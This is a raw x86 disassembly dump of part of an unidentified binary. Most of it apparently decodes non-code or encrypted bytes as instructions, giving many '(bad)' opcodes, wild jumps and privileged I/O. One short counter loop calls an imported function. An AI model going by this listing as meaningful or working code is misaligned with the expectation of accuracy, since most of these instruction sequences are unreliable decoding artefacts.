  4193e8:	in     al,0x8a
  4193ea:	adc    edx,DWORD PTR [esi]
  4193ec:	mov    DWORD PTR [ebx],edi
  4193ee:	call   0x9cd16093
  4193f3:	ds sub al,0x51
  4193f6:	pop    ebp
  4193f7:	or     esp,DWORD PTR cs:[ecx-0x3d]
  4193fb:	pop    ecx
  4193fc:	fadd   QWORD PTR [edx-0x16]
  4193ff:	aad    0x65
  419401:	xor    dh,BYTE PTR [eax-0x39]
  419404:	push   ebp
  419405:	stos   DWORD PTR es:[edi],eax
  419406:	pusha  
  419407:	xchg   ebx,eax
  419408:	loop   0x419478
  41940a:	je     0x41941b
  41940c:	fnstenv [ebx+0x14364ba4]
  419412:	mov    ah,0xff
  419414:	imul   ebp,DWORD PTR [ebx-0x590448f],0xc37a0012
  41941e:	mov    bl,0xde
  419420:	cmp    bh,BYTE PTR [ebx-0x649aba37]
  419426:	fcomp  DWORD PTR ds:0x4e308068
  41942c:	(bad)  
  41942d:	jmp    0xf9401c35
  419432:	jmp    0x99d70b0
  419437:	leave  
  419438:	lahf   
  419439:	arpl   WORD PTR [ebp+esi*8-0x55],cx
  41943d:	push   DWORD PTR [ecx]
  41943f:	mov    esi,0xe9e99cd9
  419444:	or     al,BYTE PTR [edx-0x65e82a0f]
  41944a:	sub    ebx,DWORD PTR [ecx-0x15afeaeb]
  419450:	inc    edx
  419451:	nop
  419452:	jmp    0x4194c1
  419454:	(bad)  
  419455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419456:	jae    0x4194a8
  419458:	mov    ebp,0x9c122469
  41945d:	xchg   ebx,eax
  41945e:	inc    ebp
  41945f:	call   0xb7275440
  419464:	aam    0xbb
  419466:	sub    dl,BYTE PTR [ecx]
  419468:	iret   
  419469:	out    dx,eax
  41946a:	ret    0xfeac
  41946d:	cmc    
  41946e:	jne    0x41949e
  419470:	mov    dh,0x2d
  419472:	and    dl,BYTE PTR [eax+0x5fc74ba2]
  419478:	std    
  419479:	and    al,0x94
  41947b:	sti    
  41947c:	mov    dl,0x31
  41947e:	sbb    BYTE PTR [edi-0x1a],bl
  419481:	and    al,0xbe
  419483:	test   eax,0xca895467
  419488:	sahf   
  419489:	push   0xffffff92
  41948b:	cdq    
  41948c:	rdmsr  
  41948e:	or     DWORD PTR [eax-0x63],esi
  419491:	les    ecx,FWORD PTR [ecx+0x1c7a1872]
  419497:	mov    ch,0x17
  419499:	shl    DWORD PTR [edi],cl
  41949b:	test   eax,0xf6953cba
  4194a0:	(bad)  [edx]
  4194a2:	add    al,0x3d
  4194a4:	sbb    eax,0x48f40583
  4194a9:	mov    ch,0x5c
  4194ab:	sub    al,0xf5
  4194ad:	xchg   esi,eax
  4194ae:	rcl    edx,1
  4194b0:	mov    edi,0xc4f73c7e
  4194b5:	xchg   ebp,eax
  4194b6:	xlat   BYTE PTR ds:[ebx]
  4194b7:	cmp    ecx,DWORD PTR [ebx-0x50]
  4194ba:	cmp    BYTE PTR [eax+0x67],al
  4194bd:	mov    cl,0xfb
  4194bf:	ror    BYTE PTR [edx+0x4b6c6c1],1
  4194c5:	loope  0x41951d
  4194c7:	and    esp,edx
  4194c9:	retf   0xc34e
  4194cc:	das    
  4194cd:	mov    al,0xde
  4194cf:	in     al,dx
  4194d0:	and    BYTE PTR [eax-0x681c8e94],ch
  4194d6:	or     ch,BYTE PTR [edx]
  4194d8:	mov    BYTE PTR [eax+0x5df8636b],al
  4194de:	enter  0x886a,0xfe
  4194e2:	lds    eax,FWORD PTR [eax]
  4194e4:	jecxz  0x4194f7
  4194e6:	ret    0x5097
  4194e9:	fiadd  DWORD PTR [edi]
  4194eb:	xchg   esp,eax
  4194ec:	out    dx,al
  4194ed:	js     0x419491
  4194ef:	xor    bl,dh
  4194f1:	imul   ebp,DWORD PTR [esi-0x62],0xffffffba
  4194f5:	push   0x448e633c
  4194fa:	sbb    eax,0x579001a9
  4194ff:	add    BYTE PTR [ecx-0x567a762],al
  419505:	inc    ecx
  419506:	xchg   ebx,eax
  419507:	xor    DWORD PTR [edi-0x40],esp
  41950a:	sbb    DWORD PTR [ebx+ebp*4-0x6b6aa34c],edi
  419511:	pop    edi
  419512:	pop    esi
  419513:	int3   
  419514:	xlat   BYTE PTR ds:[ebx]
  419515:	pop    esp
  419516:	mov    edi,0xe97604ab
  41951b:	dec    ebx
  41951c:	xor    eax,0xb836df28
  419521:	rcl    BYTE PTR [eax],cl
  419523:	mov    ebx,esp
  419525:	stos   DWORD PTR es:[edi],eax
  419526:	iret   
  419527:	mov    ds:0x6a9705c2,al
  41952c:	test   al,0xf5
  41952e:	lock lahf 
  419530:	sub    ecx,DWORD PTR [eax-0x74e8c938]
  419536:	inc    edx
  419537:	cwde   
  419538:	call   0xa098:0x44356d7
  41953f:	mov    ebx,DWORD PTR [edi-0x591bb831]
  419545:	cmp    DWORD PTR [edi+0x1e5f323b],edi
  41954b:	or     ecx,ebx
  41954d:	adc    eax,0xe71a46c8
  419552:	leave  
  419553:	mov    ds:0x6a92c615,al
  419558:	sub    eax,0xdc06e852
  41955d:	not    BYTE PTR [ebx-0x2d41d6be]
  419563:	pop    esi
  419564:	test   BYTE PTR [ebp-0x8d29e29],bl
  41956a:	jns    0x4195c5
  41956c:	mov    eax,ds:0xfe9b6f75
  419571:	enter  0xeb52,0xe3
  419575:	or     ah,BYTE PTR [eax]
  419577:	jp     0x4195bb
  419579:	sub    al,ch
  41957b:	(bad)  
  41957c:	test   eax,0x7cf4b2a6
  419581:	xor    BYTE PTR [ebx-0x3e9ad859],bh
  419587:	popa   
  419588:	aas    
  419589:	sbb    DWORD PTR [ebp+0x25],0xfffffff8
  41958d:	xlat   BYTE PTR ds:[ebx]
  41958e:	repnz adc al,0x3b
  419591:	xor    dl,BYTE PTR [eax+0x64]
  419594:	test   al,0x1f
  419596:	(bad)
  419599:	lahf   
  41959a:	jl     0x419539
  41959c:	sub    bh,cl
  41959e:	sbb    al,0x9f
  4195a0:	into   
  4195a1:	clc    
  4195a2:	jno    0x41958e
  4195a4:	cmp    ch,BYTE PTR [esi]
  4195a6:	push   ss
  4195a7:	sti    
  4195a8:	mov    ah,0xf
  4195aa:	jle    0x419596
  4195ac:	out    0x56,al
  4195ae:	stos   BYTE PTR es:[edi],al
  4195af:	push   ds
  4195b0:	ret    0x9351
  4195b3:	adc    eax,0x10f926ae
  4195b8:	push   ds
  4195b9:	dec    esi
  4195ba:	iret   
  4195bb:	mov    esi,esp
  4195bd:	or     edi,ecx
  4195bf:	mov    ecx,0xd7f6e206
  4195c4:	sub    al,0x89
  4195c6:	arpl   WORD PTR [eax+edx*2-0x6bde7357],di
  4195cd:	outs   dx,BYTE PTR ds:[esi]
  4195ce:	shr    BYTE PTR [edi-0x53],1
  4195d1:	jp     0x419589
  4195d3:	adc    esp,ebp
  4195d5:	ret    0x9d35
  4195d8:	adc    al,0x40
  4195da:	es cmp ebx,esp
  4195dd:	jecxz  0x419611
  4195df:	arpl   WORD PTR [ebx+0x15],ax
  4195e2:	mov    al,ds:0xbcc610c5
  4195e7:	daa    
  4195e8:	mov    al,0x99
  4195ea:	or     bh,ch
  4195ec:	xchg   ebp,eax
  4195ed:	nop
  4195ee:	shr    BYTE PTR [esi+0x21],0x81
  4195f2:	xchg   esp,eax
  4195f3:	cmp    al,0x9b
  4195f5:	out    dx,eax
  4195f6:	aad    0xf6
  4195f8:	push   0x6fbef75e
  4195fd:	shl    DWORD PTR [ebx-0x1f97746a],1
  419603:	push   es
  419604:	push   es
  419605:	xor    ch,dh
  419607:	or     al,0xbc
  419609:	lahf   
  41960a:	mov    ebp,esp
  41960c:	mov    ebx,0x404517d8
  419611:	loope  0x4195c7
  419613:	mov    dh,0xbd
  419615:	ret    
  419616:	imul   edi,edx,0xffffffe8
  419619:	sbb    DWORD PTR [edx-0x1d],esi
  41961c:	mov    ebx,0x60699a18
  419621:	mov    BYTE PTR [edi+esi*2+0x46dc603b],al
  419628:	enter  0x9391,0xc5
  41962c:	imul   esi,DWORD PTR [ebx+0x5a],0x568fca22
  419633:	sbb    esp,edx
  419635:	adc    al,0x9e
  419637:	scas   al,BYTE PTR es:[edi]
  419638:	aad    0x26
  41963a:	jge    0x4195cd
  41963c:	add    cl,BYTE PTR [edx]
  41963e:	or     ebx,esi
  419640:	ja     0x4196af
  419642:	xchg   esi,eax
  419643:	sti    
  419644:	jb     0x419648
  419646:	jmp    0x41961d
  419648:	cmp    DWORD PTR [ecx+0x366e51ec],0xffffffcd
  41964f:	imul   eax,DWORD PTR [ebx],0x738fa59d
  419655:	not    DWORD PTR [ebx-0x2a]
  419658:	dec    edx
  419659:	(bad)  
  41965a:	outs   dx,DWORD PTR ds:[esi]
  41965b:	loope  0x419669
  41965d:	jno    0x4196a8
  41965f:	push   cs
  419660:	dec    esi
  419661:	(bad)  
  419662:	mov    WORD PTR [ecx],ds
  419664:	imul   eax,esi,0x3d
  419667:	dec    edx
  419668:	sbb    BYTE PTR [esi],ch
  41966a:	jbe    0x419668
  41966c:	popa   
  41966d:	mov    esi,0x9315d953
  419672:	pop    ebx
  419673:	aas    
  419674:	xor    eax,0x71324530
  419679:	xchg   edi,eax
  41967a:	out    dx,al
  41967b:	in     eax,dx
  41967c:	mov    ebx,0x702d81db
  419681:	xlat   BYTE PTR ds:[ebx]
  419682:	and    al,0x24
  419684:	pop    edx
  419685:	inc    esi
  419686:	mov    cl,0x6d
  419688:	out    dx,al
  419689:	xchg   ecx,eax
  41968a:	inc    ebp
  41968b:	jl     0x419620
  41968d:	(bad)  
  41968e:	rcr    BYTE PTR [edx-0x55],0xbb
  419692:	push   ds
  419693:	or     BYTE PTR [edx-0x57fc3bf0],ch
  419699:	clc    
  41969a:	call   0xb307:0xcc0f7673
  4196a1:	ins    BYTE PTR es:[edi],dx
  4196a2:	ds js  0x419714
  4196a5:	(bad)  
  4196a6:	js     0x4196c8
  4196a8:	inc    edi
  4196a9:	cmc    
  4196aa:	iret   
  4196ab:	cmp    DWORD PTR [edi-0xfb2860f],0x7
  4196b2:	stos   DWORD PTR es:[edi],eax
  4196b3:	mov    esi,0x1c46111c
  4196b8:	add    BYTE PTR [eax+0x7e],al
  4196bb:	sbb    dh,BYTE PTR [ecx]
  4196bd:	mov    dl,0xb6
  4196bf:	xchg   edi,eax
  4196c0:	fisttp DWORD PTR [edi+ebp*4-0x73]
  4196c4:	sbb    BYTE PTR [edi+0x42],al
  4196c7:	adc    al,0xca
  4196c9:	das    
  4196ca:	es adc al,0x3a
  4196cd:	enter  0x3ee5,0xa4
  4196d1:	repz imul BYTE PTR [edi+0x28]
  4196d5:	jno    0x419702
  4196d7:	pop    edi
  4196d8:	out    dx,eax
  4196d9:	pop    edx
  4196da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196db:	and    DWORD PTR ds:0xf44ad85d,esp
  4196e1:	les    esi,FWORD PTR [esi]
  4196e3:	push   esp
  4196e4:	xor    eax,0xe799b190
  4196e9:	push   0xffffffed
  4196eb:	jl     0x4196e1
  4196ed:	sbb    esi,edx
  4196ef:	into   
  4196f0:	outs   dx,DWORD PTR ds:[esi]
  4196f1:	ins    DWORD PTR es:[edi],dx
  4196f2:	mov    ecx,0x86cd599e
  4196f7:	push   edx
  4196f8:	shld   DWORD PTR [eax+0x7b752b92],ebx,cl
  4196ff:	test   BYTE PTR [edi+0x54],ch
  419702:	cmc    
  419703:	and    al,0x3d
  419705:	les    esi,FWORD PTR [ebx]
  419707:	sti    
  419708:	jbe    0x419789
  41970a:	(bad)  
  41970b:	fcmove st,st(4)
  41970d:	fs sti 
  41970f:	pop    es
  419710:	int    0xf4
  419712:	je     0x4196cc
  419714:	leave  
  419715:	jnp    0x419796
  419717:	cmp    eax,0x79d3ea12
  41971c:	inc    esi
  41971d:	(bad)  
  41971e:	bnd ja 0x4196bd
  419721:	xor    al,0x16
  419723:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  41972a:	mov    DWORD PTR ds:0x42a3a5,0x1e
  419734:	cmp    DWORD PTR ds:0x42a3a5,0x0
  41973b:	je     0x419c82
  419741:	cmp    DWORD PTR ds:0x42a3a5,0x20
  419748:	jne    0x41975c
  41974e:	push   0x7cac
  419753:	push   DWORD PTR [ebp-0x20]
  419756:	call   DWORD PTR ds:0x4251e4
  41975c:	mov    edx,DWORD PTR ds:0x42a3a5
  419762:	dec    edx
  419763:	mov    DWORD PTR ds:0x42a3a5,edx
  419769:	jmp    0x419734
  41976e:	adc    edx,edx
  419770:	jmp    0x419c82
  419775:	mov    bh,0xcc
  419778:	rcl    ecx,cl
  41977a:	fcmovnb st,st(5)
  41977c:	fnstcw WORD PTR [eax+0x60]
  41977f:	or     bh,al
  419781:	mov    bl,0x57
  419783:	push   ebp
  419784:	rol    DWORD PTR [esi],cl
  419786:	icebp  
  419787:	jg     0x419801
  419789:	jae    0x419807
  41978b:	js     0x419805
  41978d:	pop    ss
  41978e:	retf   
  41978f:	mov    edx,0xdb25ccd0
  419794:	cld    
  419795:	inc    esp
  419796:	nop
  419797:	jns    0x419771
  419799:	or     DWORD PTR [edi-0x285e7f03],esi
  41979f:	mov    edi,0xccaad209
  4197a4:	daa    
  4197a5:	pop    esp
  4197a6:	push   DWORD PTR [ebp-0x305467b4]
  4197ac:	cwde   
  4197ad:	sub    edx,0xcd544d85
  4197b3:	xor    BYTE PTR [esi+edx*2-0x2c],0xd2
  4197b8:	sahf   
  4197b9:	or     DWORD PTR [ebp+0x4495b773],0xfffffff3
  4197c0:	add    BYTE PTR [esi],dl
  4197c2:	std    
  4197c3:	stos   DWORD PTR es:[edi],eax
  4197c4:	and    DWORD PTR [eax-0x2be5f4],0xffffffff
  4197cb:	push   ecx
  4197cc:	mov    cl,0x7a
  4197ce:	mov    ebp,0x42194851
  4197d3:	mov    ecx,0xbd9732b0
  4197d8:	pop    ebx
  4197d9:	test   BYTE PTR [eiz*2+0x56989e80],ch
  4197e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197e1:	aam    0xc6
  4197e3:	xchg   esp,eax
  4197e4:	dec    edx
  4197e5:	pop    ebp
  4197e6:	mov    fs,WORD PTR [eax+0x2d]
  4197e9:	mov    ah,0x18
  4197eb:	out    dx,al
  4197ec:	(bad)  
  4197ed:	arpl   WORD PTR [ebx],si
  4197ef:	push   0xe9e2f0e3
  4197f4:	cdq    
  4197f5:	fstp   QWORD PTR [esp+eiz*8-0x22]
  4197f9:	retf   
  4197fa:	mov    ebx,0x91ee2f3c
  4197ff:	mov    DWORD PTR [edi+eax*4-0x1bc602b9],eax
  419806:	test   eax,0xebf7519
  41980b:	out    0x82,eax
  41980d:	cmp    DWORD PTR [edx+0x7b],0x264df230
  419814:	xor    eax,0x36223558
  419819:	into   
  41981a:	mov    bh,BYTE PTR [ebx+0x7f]
  41981d:	push   edx
  41981e:	or     DWORD PTR [edx],ecx
  419820:	cmp    BYTE PTR [edx+edx*8-0xbdf8bd0],bl
  419827:	sub    al,0x2a
  419829:	mov    esi,0x814a01c1
  41982e:	mov    dl,0xdd
  419830:	in     eax,0x73
  419832:	jo     0x419852
  419834:	pop    eax
  419835:	adc    bl,BYTE PTR [edx-0x7e]
  419838:	pop    ebx
  419839:	pop    es
  41983a:	bndldx (bad),[edx+0x4007bb6f]
  419841:	cmc    
  419842:	adc    dl,dh
  419844:	addr16 adc eax,0xb5f85075
  41984a:	push   ds
  41984b:	jns    0x4197f9
  41984d:	mov    edi,esi
  41984f:	xchg   BYTE PTR [eax],ch
  419851:	sub    DWORD PTR [ecx+0x1ed337d7],ecx
  419857:	mov    al,0x27
  419859:	adc    esi,DWORD PTR [ecx-0x5a6cec74]
  41985f:	inc    ebp
  419860:	jge    0x419891
  419862:	mov    dh,0x37
  419864:	mov    eax,ds:0x8ada90a
  419869:	test   BYTE PTR [edx],al
  41986b:	dec    edi
  41986c:	fst    QWORD PTR [ebp-0x5]
  41986f:	lock ins DWORD PTR es:[edi],dx
  419871:	outs   dx,DWORD PTR ds:[esi]
  419872:	test   DWORD PTR [esi],edx
  419874:	mov    eax,ds:0xe111fea9
  419879:	sbb    eax,0xb5b36c88
  41987e:	mov    ds:0xc65249bc,eax
  419883:	pop    edx
  419884:	pop    edx
  419885:	stos   BYTE PTR es:[edi],al
  419886:	xor    dh,BYTE PTR [ecx]
  419888:	xchg   ch,dl
  41988a:	cli    
  41988b:	mov    esp,0x38375d3
  419890:	mov    ah,BYTE PTR [ebx+0x48370b4d]
  419896:	hlt    
  419897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419898:	mov    ecx,0x7d01dc59
  41989d:	xchg   edx,eax
  41989e:	and    dh,BYTE PTR [ecx]
  4198a0:	popa   
  4198a1:	adc    eax,0x81c9dc26
  4198a6:	fdivr  DWORD PTR [edx]
  4198a8:	(bad)  
  4198aa:	shl    DWORD PTR [ebx+0x4eaf2134],cl
  4198b0:	mov    ebx,ebx
  4198b2:	sbb    eax,0xbe97e7df
  4198b7:	fistp  QWORD PTR [eax-0x3d2882da]
  4198bd:	mov    ebp,0xcecc99c9
  4198c2:	stos   DWORD PTR es:[edi],eax
  4198c3:	push   ebx
  4198c4:	stc    
  4198c5:	inc    eax
  4198c6:	dec    ebx
  4198c7:	jns    0x4198d5
  4198c9:	aas    
  4198ca:	pop    es
  4198cb:	cmp    eax,0xe5b3c6a3
  4198d0:	or     esp,DWORD PTR [eax]
  4198d2:	jle    0x419942
  4198d4:	hlt    
  4198d5:	ja     0x419905
  4198d7:	neg    DWORD PTR [ebp+eiz*1-0x6e5f0182]
  4198de:	inc    edi
  4198df:	dec    eax
  4198e0:	fild   DWORD PTR [ecx]
  4198e2:	lock rol DWORD PTR [eax-0x524d0ef6],0x20
  4198ea:	inc    esi
  4198eb:	lods   al,BYTE PTR ds:[esi]
  4198ec:	mov    ebp,0x18d89f1a
  4198f1:	mov    edx,DWORD PTR [esi-0x27]
  4198f4:	inc    eax
  4198f5:	clc    
  4198f6:	mov    bh,0x2f
  4198f8:	dec    esi
  4198f9:	mov    ds:0x57ff8219,eax
  4198fe:	ins    DWORD PTR es:[edi],dx
  4198ff:	pusha  
  419900:	mov    edx,0x70d29515
  419905:	and    dl,BYTE PTR [ebp+0x9041e0a]
  41990b:	mov    ecx,0x469eda6a
  419910:	jmp    0x41995e
  419912:	repnz and BYTE PTR [edi+0x656ed36],0xe1
  41991a:	leave  
  41991b:	retf   
  41991c:	pushf  
  41991d:	shl    BYTE PTR [edx-0x2cce9f4f],cl
  419923:	imul   esp,DWORD PTR [edi+0x36ee3167],0x76aa42fe
  41992d:	je     0x419973
  41992f:	pop    ebp
  419930:	jbe    0x419949
  419932:	pop    eax
  419933:	jb     0x4198f6
  419935:	mov    esp,DWORD PTR [eax+0x27]
  419938:	and    BYTE PTR [ecx+0x5845482a],al
  41993e:	sub    DWORD PTR [eax+ebx*1],eax
  419941:	xor    al,BYTE PTR [edx+0x43]
  419944:	aam    0x14
  419946:	(bad)  
  419947:	xchg   esp,eax
  419948:	aas    
  419949:	jns    0x41995c
  41994b:	cmc    
  41994c:	pop    edx
  41994d:	pop    ecx
  41994e:	out    0x42,eax
  419950:	inc    ebx
  419951:	repnz or cl,BYTE PTR [edi-0x343f29e1]
  419958:	test   BYTE PTR [edi-0x25],dl
  41995b:	pop    edx
  41995c:	pop    es
  41995d:	fdivr  DWORD PTR cs:[edx-0x262f176]
  419964:	(bad)  
  419965:	xor    ebx,DWORD PTR [ecx]
  419967:	pusha  
  419968:	mov    bl,0xf2
  41996a:	loop   0x41999f
  41996c:	push   eax
  41996d:	inc    esp
  41996e:	rcl    BYTE PTR [esi+0x4c693b11],1
  419974:	push   cs
  419975:	(bad)  
  419976:	xchg   edi,eax
  419977:	push   ds
  419978:	dec    ebp
  419979:	xor    BYTE PTR [eax+ebp*8],ch
  41997c:	sbb    eax,0x5221cbab
  419981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419982:	sbb    al,0x75
  419984:	add    DWORD PTR ds:0x2d49336b,0x3bbc58e2
  41998e:	cmp    cl,bl
  419990:	cmp    ecx,DWORD PTR [ecx-0x7a]
  419993:	aaa    
  419994:	mov    esi,DWORD PTR [eax]
  419996:	lds    ecx,FWORD PTR [ebx]
  419998:	fsubr  QWORD PTR [eax]
  41999a:	(bad)  
  41999b:	jmp    0x6f405bd4
  4199a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a1:	xchg   edx,eax
  4199a2:	ins    BYTE PTR es:[edi],dx
  4199a3:	cmc    
  4199a4:	shr    DWORD PTR [ecx-0x65],0x69
  4199a8:	mov    DWORD PTR [esi],edi
  4199aa:	js     0x419988
  4199ac:	and    eax,0x8f2f5ca6
  4199b1:	(bad)  
  4199b2:	je     0x41996a
  4199b4:	or     al,0xc1
  4199b6:	mov    ecx,0xd82dd95a
  4199bb:	push   edx
  4199bc:	sub    BYTE PTR ds:0x2b0cdf58,ch
  4199c2:	es jnp 0x4199b0
  4199c5:	retf   0xfd8c
  4199c8:	adc    BYTE PTR [eax+0x2239e566],al
  4199ce:	cmp    al,0x4c
  4199d0:	sub    al,0xdf
  4199d2:	adc    al,0x64
  4199d4:	mov    al,ds:0xebbe8608
  4199d9:	(bad)  
  4199da:	in     al,0x53
  4199dc:	scas   eax,DWORD PTR es:[edi]
  4199dd:	and    al,0xe2
  4199df:	xchg   DWORD PTR ds:0x53a813d2,ebp
  4199e5:	retf   0xb10a
  4199e8:	push   ss
  4199e9:	loope  0x4199c9
  4199eb:	jp     0x4199eb
  4199ed:	mov    bh,0xa6
  4199ef:	daa    
  4199f0:	and    eax,0x6c0024cb
  4199f5:	int    0x69
  4199f7:	in     eax,0x20
  4199f9:	rcr    BYTE PTR [ecx+0x18c01a6d],0x8b
  419a00:	test   al,0x3b
  419a02:	fnstenv [ebp-0x4d]
  419a05:	popf   
  419a06:	sahf   
  419a07:	xchg   esp,eax
  419a08:	test   BYTE PTR [ecx+0x30],al
  419a0b:	sbb    BYTE PTR [ebp-0x41],bl
  419a0e:	mov    gs:0x95728a94,eax
  419a14:	(bad)  
  419a15:	sub    DWORD PTR [esi],esi
  419a17:	sub    DWORD PTR ds:0xe29b79f,0xfe69fd8d
  419a21:	inc    ecx
  419a22:	call   0x87663681
  419a27:	pop    ebp
  419a28:	and    BYTE PTR [ecx],dh
  419a2a:	les    eax,FWORD PTR [esi+ebp*1+0x58c4eb]
  419a31:	xchg   esi,eax
  419a32:	(bad)  
  419a33:	dec    eax
  419a34:	sub    esp,DWORD PTR [ebp-0x1f]
  419a37:	pop    esi
  419a39:	cwde   
  419a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a3b:	jecxz  0x419a9a
  419a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a3e:	xchg   esp,eax
  419a3f:	mov    ah,0x54
  419a41:	sahf   
  419a42:	sub    esi,DWORD PTR [esi]
  419a44:	enter  0xeae1,0x38
  419a48:	xor    ch,BYTE PTR [ebx-0x73]
  419a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a4c:	mov    bh,0x99
  419a4e:	test   bl,bl
  419a50:	mov    al,ds:0x86715019
  419a55:	cmp    BYTE PTR [edx+ecx*4-0x2],bl
  419a59:	xor    DWORD PTR [ebp-0x73fe2663],esp
  419a5f:	mov    dl,0xc6
  419a61:	pop    ds
  419a62:	das    
  419a63:	xor    bh,ah
  419a65:	leave  
  419a66:	mov    ch,cl
  419a68:	fist   DWORD PTR [edi-0x15]
  419a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a6c:	cmp    al,0xd2
  419a6e:	pushf  
  419a6f:	mov    al,0x3
  419a71:	xchg   edx,eax
  419a72:	data16 shl BYTE PTR [eax-0x12],0x8d
  419a77:	jg     0x419aa3
  419a79:	cs push 0xaadbbdfe
  419a7f:	sub    BYTE PTR [ecx+0x7c8ddee1],0xf5
  419a86:	push   es
  419a87:	add    ecx,DWORD PTR [ebx]
  419a89:	jnp    0x419aaa
  419a8b:	xor    DWORD PTR ds:0x19dc99c6,ecx
  419a91:	aaa    
  419a92:	retf   0x8a33
  419a95:	jns    0x419a5c
  419a97:	push   cs
  419a98:	mov    edx,0x4d08e8e7
  419a9d:	arpl   si,si
  419a9f:	imul   ebx,esp,0xffffffeb
  419aa2:	xor    ah,al
  419aa4:	stos   BYTE PTR es:[edi],al
  419aa5:	jg     0x419a62
  419aa7:	(bad)  
  419aa8:	or     al,0x5d
  419aaa:	sar    ch,0x2
  419aad:	jmp    0x6f3:0x102515bb
  419ab4:	inc    edx
  419ab5:	push   ecx
  419ab6:	ja     0x419aa8
  419ab8:	mov    esp,0x3bb5ae05
  419abd:	cwde   
  419abe:	std    
  419abf:	xor    DWORD PTR [esi-0x62],edx
  419ac2:	loop   0x419ae3
  419ac4:	or     DWORD PTR [ecx+0x329fed96],edi
  419aca:	push   esp
  419acb:	add    BYTE PTR [edx+0x23],ch
  419ace:	enter  0xa496,0x4e
  419ad2:	mov    al,ds:0x80e06e2f
  419ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad8:	push   0xffffffc0
  419ada:	mov    ecx,0x94c4fbc7
  419adf:	test   al,0xc7
  419ae1:	push   ds
  419ae2:	cmp    ah,BYTE PTR [ebx+eax*1]
  419ae5:	sbb    ebp,esi
  419ae7:	adc    BYTE PTR [edi],ch
  419ae9:	psrld  mm5,QWORD PTR [ebx-0x1fc5c7ea]
  419af0:	fisubr WORD PTR [ebx-0xe5694fb]
  419af6:	cmp    al,0xb
  419af8:	(bad)  [ecx+0x2925c39c]
  419afe:	lds    ebx,FWORD PTR [ebp+0x3885b7e3]
  419b04:	scas   al,BYTE PTR es:[edi]
  419b05:	xchg   DWORD PTR [ebp-0x1c4e7e02],ebp
  419b0b:	fcomp  DWORD PTR ds:0x73df48e4
  419b11:	or     dl,BYTE PTR [eax]
  419b13:	or     DWORD PTR [esi+0x8],edi
  419b16:	xor    BYTE PTR [esi],bl
  419b18:	stc    
  419b19:	nop
  419b1a:	dec    esi
  419b1b:	mov    esp,0x1986c910
  419b20:	lods   al,BYTE PTR ds:[esi]
  419b21:	add    BYTE PTR [ebp+0x29e8fa3d],cl
  419b27:	int    0x6f
  419b29:	xor    bh,BYTE PTR [edi]
  419b2b:	dec    edx
  419b2c:	sub    BYTE PTR [ebx+0x6a],cl
  419b2f:	dec    eax
  419b30:	dec    esp
  419b31:	test   al,0xee
  419b33:	sub    dh,BYTE PTR [edx-0x57]
  419b36:	test   eax,0x3445ed12
  419b3b:	mov    eax,0xa09f3089
  419b40:	daa    
  419b41:	jns    0x419b51
  419b43:	stos   BYTE PTR es:[edi],al
  419b44:	xlat   BYTE PTR ds:[ebx]
  419b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b46:	push   esi
  419b47:	bound  edi,QWORD PTR [edx-0xc]
  419b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4b:	cmp    dh,BYTE PTR [ebp+0x7e]
  419b4e:	imul   ecx,DWORD PTR [eax+ebp*8+0x1d],0xa897413d
  419b56:	adc    DWORD PTR ds:0xf131e52e,edx
  419b5c:	inc    esp
  419b5d:	shl    dh,1
  419b5f:	out    dx,al
  419b60:	ja     0x419b64
  419b62:	inc    esi
  419b63:	mov    ebp,0x8726c599
  419b68:	jecxz  0x419ba9
  419b6a:	xor    BYTE PTR [esp+eax*2+0x10],0x56
  419b6f:	sbb    eax,0x65ec4420
  419b74:	in     al,dx
  419b75:	xor    al,0x63
  419b77:	mov    ebp,0x6da00151
  419b7c:	push   0x1815f02
  419b81:	popa   
  419b82:	scas   eax,DWORD PTR es:[edi]
  419b83:	aad    0xb6
  419b85:	ret    0xfc28
  419b88:	lahf   
  419b89:	and    ebp,DWORD PTR [edi-0x53]
  419b8c:	popa   
  419b8d:	je     0x419bc9
  419b8f:	and    BYTE PTR [ecx],al
  419b91:	dec    esp
  419b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b93:	fst    QWORD PTR [ebx-0x5c696005]
  419b99:	pop    edx
  419b9a:	xchg   edx,eax
  419b9b:	jne    0x419bf5
  419b9d:	scas   eax,DWORD PTR es:[edi]
  419b9e:	jo     0x419bbf
  419ba0:	lahf   
  419ba1:	cmp    eax,0x9803915b
  419ba6:	cmp    al,0xc2
  419ba8:	cli    
  419ba9:	mov    esi,0xfa49cfc
  419bae:	push   edi
  419baf:	loop   0x419bef
  419bb1:	jmp    0xdb73:0x796ce805
  419bb8:	push   edx
  419bb9:	loope  0x419b87
  419bbb:	sbb    ah,ah
  419bbd:	xor    BYTE PTR [eax],cl
  419bbf:	mov    cl,0x9
  419bc1:	jns    0x419bb9
  419bc3:	push   eax
  419bc4:	push   ds
  419bc5:	mov    eax,ds:0xf481ea53
  419bca:	dec    ebx
  419bcb:	xchg   ecx,edi
  419bcd:	cmp    BYTE PTR [ecx-0x3bd4fd15],al
  419bd3:	and    dl,BYTE PTR [esi]
  419bd5:	sub    edi,DWORD PTR [ebx-0x6d]
  419bd8:	jb     0x419c23
  419bda:	test   eax,0xadc1f038
  419bdf:	mov    eax,0x46441e10
  419be4:	xor    BYTE PTR [ebx+0x67],dh
  419be7:	sbb    dh,al
  419be9:	imul   ebp,DWORD PTR [esi+0x35],0x50e853c5
  419bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf1:	clc    
  419bf2:	stos   BYTE PTR es:[edi],al
  419bf3:	imul   eax,DWORD PTR [edx],0xffffff92
  419bf6:	dec    edi
  419bf7:	mov    eax,0x60525b54
  419bfc:	fsubr  QWORD PTR [edx+esi*2-0x3b]
  419c00:	inc    eax
